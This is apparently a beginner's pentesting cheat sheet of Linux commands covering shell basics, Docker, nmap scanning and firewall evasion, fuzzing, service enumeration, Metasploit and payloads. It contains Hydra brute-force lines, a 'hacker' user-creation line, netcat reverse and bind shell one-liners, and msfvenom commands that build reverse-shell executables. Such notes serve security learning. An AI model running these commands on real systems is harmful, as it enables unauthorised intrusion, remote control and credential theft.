This is a beginner repository of basic linux pentest commands. As a beginner, I wrote down all the commands I learned when I was introduced in pentesting. This is not finished and I'm updating while keep learning. 

# Bash Shell Shortcuts and Shorthand

**ctrl + c** – terminate the currently running command

**ctrl + r** – search the current terminal session’s command history

**ctrl + a** – go to the start of line (useful if you need to correct a typo at the beginning of a very long command)

**ctrl + e** – go the the end of line

**ctrl + z** – sleep program

**!!** – reissues the last command that was run

**!command** (i.e. !ping) – reissues the last command starting with the supplied parameters, which is the last ping command in this example

**Up arrow** – search through the cached history of previously run commands

**Down arrow** – sort through the history of used commands to the most recent command

**Tab** – the tab key is useful for auto-completing file and directory names within the current working directory, which save you the trouble of having to type them out



# Basic Shell Commands

**mount** – displays mounted media and file systems

**uptime** – displays how long the system has been active

**clear** – if there is too much information printed to the current terminal screen, you can wipe it all clean with the clear command

**date** – displays the time and date that is configured within the operating system

**whoami** – displays the current active user in the shell

**su root** – prompts you for a root password to login and run commands with root privileges

**pwd** – prints your current working directory, which is your current location in the file system

**ls** – this is the list command, which prints the files and directories within your current working directory

**ls -l** – this option is known as a “long listing,” and shows detailed information about the files and directories in your current working directory

**ls -la** – this command will show you a long listing, and the -a option shows you all files; by default, hidden files that start with the “.” character are omitted

**cd /directory** – the cd command is useful for navigating the Linux files system; simply perform an ls command to see directories accessible in your current working directory

**cd ../** – this command will set you one level higher in the current working directory tree

**command | grep parameters (i.e. ls | grep myfile.txt)** – piping command output to grep and supplying it with parameters will filter the output based on your criteria

**ps aux** – displays a list of running processes; the output is long, so it’s best to pipe it to less, more, or search through it with a tool like grep

**kill process_number** – kills a process based on it’s process ID identified with the ps aux command

**useradd** -p 'openssl passwd -1 <Password>' hacker 

**cat file | sort | uniq** – Sort and delete duplicates

**wc -l file** – Count lines

**wc -c** – Count chars

**xxd -p boot12.bin | tr -d '\n**' – Get HexDump without new lines

**openvpn vpn.ovpn** - connects to a vpn

**mkdir dir** - creates a directory

**rmdir dir** - remove directory

**touch file.format** - create a file

**echo foo > file.format** -  write file

**echo foo >> file.format** - append write file

**nano file.txt** - create a file and open writing interface

**chmod 4777** - changes permissions

**chmod +t file** - add sticky bit

**chown user:group /directory** - change propietary and group in a file or directory

**chgrp user1 dir** - change user in directory

**cat /etc/passwd | grep "name"** - search username

**cat /etc/group | grep "name"** - search group

**useradd user1 -s /bin/bash -/home/user1** - create a user with a shell and home directory

**deluser** - deletes username

**groupadd group1** - create a group

**usermod -a -G group1 user1**  - add user to a group

**delgroup group1** - delete group

**deluser user1 group1** - remove user from group

**cp file** - copy file

**cp file /dir** - copy file in directory

**cp file1 file2** - change name

**mv file /dir** - move file

**lsattr** - show file attributess

**chattr +i** - change attributess

**which** - show absolute route

**./bin bash -p** - open SUID binary 

**apt update** - update system

**apt full-updgrade -y** - upgrade system

**ps -faux** - show running processes

**./script.sh** - run bash script

**./script.py** - run python script

**jobs** - list all jobs

**jobs -r** - show running jobs

**jobs -s** - show suspended jobs

**kill % job** - kills the job id

**echo $SHELL** - show shell directory

**openvpn vpn1** - connect to vpn

**killall openvpn** - kill processes

**hostnamectl** - show host info

**sort file.txt | uniq -u** - sort items in a file that only appears once

**grep "word" file** - search word in a file or text

**base64 file** - encode data in base64

**base64 -d file** - decode data in base64

**file file** - show file info

**xxd  file** - convert data in hexdump

**xxd -r file** - reverts hexdump

**xxd -ps file** - compact hexdump

**echo $?** - show las command output code

**tail +/- number lane** - select output starting by the end

**head +/- number lane** - select lane output

**awk 'NF{print$NF}'** - print an argument, NF chooses last one

**egrep -v word** - remove lane that contains "word"

 **fsof -i:1234** - show what is running in "port"
	
**mktemp -d** - create a temporal tmp directory

**diff file1 file2** - show differences between two files

**md5sum** - create a hash from a file

**mount -t cifs //host/resource /dir/mount** - mounts file or directory from a host (port 445 in this case) to our directory

**umount /dir/mount** - dismount, you must give route



## Decompress

**tar -xvzf /path/to/yourfile.tgz**

**tar -xvjf /path/to/yourfile.tbz**

**bzip2 -d /path/to/yourfile.bz2**

**tar jxf file.tar.bz2**

**gunzip /path/to/yourfile.gz**

**unzip file.zip**

**7z -x file.7z**

**sudo apt-get install xz-utils; unxz file.xz**

**7z l file.zip** - List files inside zip

**du -hc "file"** - show file size



## Network Interface and IP Commands

**ifconfig** – the same as the ipconfig on Windows systems; this command will display interface information, such as MAC address, IPv4/IPv6 addresses, interface status, transmitted and received data, and so on

**ifconfig [interface] down (i.e. ifconfig eth0 down)** – shuts down an interface, such as a wireless, Ethernet, or tunnel interface

**ifconfig [interface] up (i.e. ifconfig eth0 up)** – enables an interface that has been shut down; taking an interface down and then up again (sometimes called bouncing an interface) can be a useful troubleshooting or reset 
procedure

**route** – displays the current routing table, including the default route


## Port and Service Commands

**netstat -l** – shows ports that are in a listening state

**netstat -a** – shows all ports (sometimes called sockets) that are in use

**netstat -u** – shows all UDP connections and ports that are open

**netstat -t** – shows all TCP connections and ports that are open

**netstat -a | grep protocol (i.e. netstat -a | grep http)** – searchs all open connections and ports for any that contain the characters “http”



## Database Commands

I had mentioned earlier that NMAP commands can be used in the Metasploit database. Metasploit comes with a lot of handy tools to build lists of hosts and run commands against those targets using NMAP commands as follows:

**db_nmap nmap_command_syntax** – the basic syntax of NMAP commands within Metasploit

**db_nmap -v -Pn 10.0.0.0/24** – scans the 10.10.10.0/24 subnet with a basic port scan in verbose mode, and adds those hosts to the database

**db_export** – exports your current database to a file and location of your choosing 

**db_import** – imports a database from another source

**db_status** – displays the status of the database; if everything is in working order, this command should return a status of “connected

**hosts** – prints a list of all the discovered hosts in the database, which could have been discovered from NMAP commands 

**hosts -a 10.0.0.0** – adds an IP address, range, or subnet to the hosts database list

**hosts -d 10.0.0.0** – deletes an IP address, range, or subnet from the hosts database list

**hosts -u** – prints all of the hosts that are known to be up



## Metasploit Command Reference

*Core Metasploit Command*

**msfupdate** – runs the automatic update function, and looks for any new exploits and vulnerabilities; note that this is run from the standard command line 

**msfconsole** – this command is how to enter the Metasploit environment and receive the msf > prompt in the terminal

**show exploits** – displays all exploits in the terminal (should be piped to another command or filtered for better results)

**show payloads** – prints all currently known payloads to the terminal (should be piped or searched with a command like grep)

**show auxiliary** – displays all auxiliary modules that are contained in the Metasploit framework

**help** – shows the main help page for Metasploit

**search name** – searches through the exploits and modules for any labeled with strings matching the supplied name

**info** – displays information about a certain module or exploit

**use name** – loads a module or exploit 

**lhost 10.0.0.0** – this should be set to your interface’s local IP address, especially if you’re currently on the same subnet or network as the target

**rhost 10.0.0.0** – use this command to set the IP address(es) of the target(s) you wish to target with the exploit 

**show options** – displays all of a modules or exploits parameters that can be set; essentially a sub-help menu for an individual module that lists all of its commands

**show targets** – displays which targets and systems can be targeted for a given module

**check** – checks to see if the currently set target is vulnerable to the attack or exploit



## Docker

**systemctl start docker** - starts docker

**docker ps** - show containers

**docker images** - show images

**docker volume ls** - show volumes

**docker build -t dockerfile .** - builds a image

**docker run -dit --name 'container image' 'image'** - run container

**docker run -dit -p22:22 --name 'container image' 'image'** - run container with port forwarding. Our port 22 becomes container's port 22

**docker rm 'container id' --force** - remove container

**docker volume rm $(docker volume ls  -q)** - remove volumes

**docker rm $(docker ps -a -q) --force** - remove all containers

**docker rmi "container id" --force** - remove image

**docker rmi $(docker images -q) --force** - remove all images

**docker exec -it 'container' bash** - execute container's shell



# Enumeration


## Discover ports: NMAP useful commands

**nmap -p- 10.0.0.0** - scan all the ports

**nmap --top-ports 500 10.0.0.0** - scan most popular ports

**nmap --open 10.0.0.0** - report only open ports

**nmap -p- --open 10.0.0.0 -v** - show open ports in verbose mode

**nmap 10.0.0.0 -n** - don't search DNS

**nmap T5/4/3/2/1 10.0.0.0** - search speed, 5 fast 0 slow

**nmap 10.0.0.0 -Pn** - ignore closed ports

**nmap -sn 10.0.0.0** - show hosts connected

### Firewall evasion NMAP

**nmap -p1234 -f** - send fragmented packets then evade firewall

**nmap 10.0.0.0 -D fakeip fakeip2 fakeip3 ...** - send packets from multiples IP

**nmap 10.0.0.0 --source-port 1234** - send packets from a possible white port with no firewall

**nmap 10.0.0.0 --spoof-mac "manufacturer"** - falsificate MAC address

**nmap -sS 10.0.0.0** - more silent



**nmap -p1234,1234... 10.0.0.0 -sCV** - show ports service versions

**nmap -p- --open -sS --min-rate 5000 10.0.0.0 -v -n -Pn** - nice nmap command



## Discover hosts in local net

**arp-scan -I "net interface" --localnet --ignoredups**

**masscan -1234,12345... -Pn 10.0.0.0 --rate=10000** - -rate 10000 packets x second



## Fuzzing: discovering directories

### Gobuster

**./gobuster dir -u url.com -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x php,html,txt -b "code"** - -x will show extensions, -b will blacklist wrong codes

### Wfuzz

**wfuzz -c --hc="code"-t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt url.com/FUZZ** - -c output color, -t threads, --hc hide code. Where /FUZZ, we can add extensions like /FUZZ.html, 
/FUZZ.php, /FUZZ.txt...  For add more routes, URL/FUZZ/FUZ2Z/FUZ3Z ...

### Ffuf

**./ffuf -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u url.com/FUZZ --mc="code"** - mc hide code

## Discovering subdomains

### Pasive

*ctfr*

**python3 ctfr.py -d url.com**

*sublist3r*

**python3 sublist3r.py -d url.com**

### Active

*Gobuster*

**gobuster vhost -u url.com -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 20 | grep -v "code"**

*wfuzz*

**wfuzz -c --hc="code" -t 20 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.url.com" url.com**



## Ports Enumeration



### Discover Technologies

**whatweb url.com** - show web technologies



## FTP enumeration: port 21

**ftp url.com** - acces to ftp server, try username "anonymous" and no password 

**nmap -- script ftp-anon -p21 10.0.0.0** - script that checks if anonymous is allowed

### Hydra brute force

**hydra -l 'user' -P /usr/share/wordlists/rockyou.txt ftp://10.0.0.0 -t 15** - -l because we know the user, -P for give password list, -t gives number of threads for operate in paralel



## SSH enumeration: port 22

**ssh user@10.0.0.0 -p 22** - connect to ssh server

**hydra -l user1 -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.0 -s 1234**

**nmap -sCV -p22 10.0.0.0** - scan SSH port version. When you have it, you can go to web launchpad.net to check the codename 

### SSH private key via JohnTheRipper

**./ssh2john id_rsa > john-readable.txt** - translate private key to JohnTheRipper readable

**/john john-readable.txt --wordlist=~/rockyou.txt**

### File transfer
**scp user1@10.0.0.0:/home/user1/filename** - copy a file from ssh to your machine

**scp filename user1@10.0.0.0:/home/username** - copy a file from you machine to ssh



## HTTP enumeration: port 80,443

**openssl s_client -connect 10.0.0.0:1234**  - show ssl certificate info

**sslscan url.com:1234** - show ssl protocols and vulnerabilities

**nmap --script ssl-heartbleed -p1234 10.0.0.0** - script that checks if is vulnerable to heartbleed

**python3 ssltest.py -p 1234 | grep -v "chains with 0s"** - shows memory, that way we can look for any information in some readable text.  You can run it repeteadly, because sometimes shows different data.



## SMB enumeration: port 445,139

**smbclient -L url.com -N** - port 445, list shared resources, -N if we don't have credentials

**smbclient //url.com/resource -N** - connects to open resource

**smbmap -H url.com** - same as smbclient

**nmap --script smb-brute.nse -p1234 10.0.0.0** - enumerates SMB users

**/usr/bin/enum4linux -a 10.0.0.0** - enumerates SMB users. Very useful




# CMS Enumeration


## Wordpress

**wpscan --url wordpressurl.com** -> scans wordpress web

**wpscan --url url.com -e vp,u** -> enumerate (-e) vulnerable plugins (vp) and users (u)

**wpscan --url url.com -e vp, u --api-token="your api token"** -> you can get an api token from wpscan web, if you give it to the command it will show you more info 

### Directories

 **wordpressurl.com/wp-content/plugins/** - some times in this directory you can see installed plugins
	
**curl -s -X GET wordpressurl.com | grep "plugins"** -  you can see web code and look for plugins

**searchsploit 'plugin'** - shows plugin exploits

**wordpressurl.com/xmlrpc.php/** - you can enumerate valid credentials

**wpscan --url wordpressurl.com:1234 -U user1 -P /usr/share/wordlists/rockyou.txt** -  search password by given user



## Joomla

**perl joomscan.pl -u joomlaurl.com** - show vulnerabilities 



## Drupal

**droopscan scan drupal --url drupalurl.com** - show vulnerabilities 



# Exploit Concepts



## Search Exploit

**searchsploit 'wordpress user enumeration'** - searchsploit is a tool that shows you registered exploits

**searchsploit -x 'id'** - shows the exploit



## Shell
 
### Reverse Shell

The victim's server is connected to attacker machine

**nc -nlvp 443** - run this command in your machine, it is a listen mode. 

-n don't check DNS, -l listen all connections (listen mode), -v verbose, -p  port to listen

**ncat -e /bin/bash 10.0.0.0  443** - run this command in victim's server, it creates a bash that you can run from listening command

**script /dev/null -c bash** - run this command in victim's server, it shows the bash in a more beautyful way (pseudo console)

### Bin Shell

The attacker's machine is connected to victim's server

**nc -nlvp 443 -e /bin/bash** - run this command in victim's server, it offers a bash to anyone who connects through indicated port

**nc 10.0.0.0 1234** - run this command in your machine, it connects to the port and if is a bash offered, you can run commands

### Forward Shell

You have to use Forward Shell when victim server has a firewall and you can't use Reverse Shell.



## Payloads
### Staged
*Metasploit*
**msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=10.0.0.0 LPORT=1234 -f exe -o reverse.exe** - creates a malicious binary, it has to be executed in victim's machine and gives you a 
reverse shell
**msfdb run** - metasploit run and sets the listener

-> **use exploit/multi/handler**

-> **set payload windows/x64/meterpreter/reverse_tcp**

-> **set LHOST 10.0.0.0**

-> **set LPORT 1234**

-> **run the .exe** - you have acces to the console





### Non-staged

**msfvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=10.0.0.0 LPORT=1234 -f exe -o reverse.exe**

*Netcat*

**msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 LHOST=10.0.0.0 LPORT=1234 -f exe -o "reverse.exe"**

-> **rlwrap nc -nlvp 1234** - if the victim has executed the .exe, you can enter in the bash with netcat (rlwrap gives you a better shell)



# Tools

## Image metadata
### Exif
**sudo apt install exif** - installs Exif
**exif image.jpg** - view image metadata
### Imagemagick
**sudo apt install imagemagick** - installs Imagemagick
**identify -verbose image.png** - view image metadata

